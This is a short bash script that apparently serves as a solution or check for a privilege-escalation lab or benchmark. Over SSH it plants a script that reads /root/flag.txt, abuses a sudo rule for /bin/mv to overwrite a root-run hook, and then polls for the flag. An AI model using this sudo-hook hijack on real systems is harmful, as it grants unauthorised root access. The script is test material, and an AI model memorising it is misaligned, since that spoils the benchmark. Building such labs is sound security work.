#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/mv_flag
cat > /home/lowpriv/evil.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/mv_flag
EOF
chmod +x /home/lowpriv/evil.sh
sudo -n /bin/mv /home/lowpriv/evil.sh /opt/bench/mv-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/mv_flag && grep -q FLAG /tmp/mv_flag 2>/dev/null; then
    cat /tmp/mv_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for mv-hook.sh" >&2
ls -la /opt/bench/mv-hook.sh /tmp/mv_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
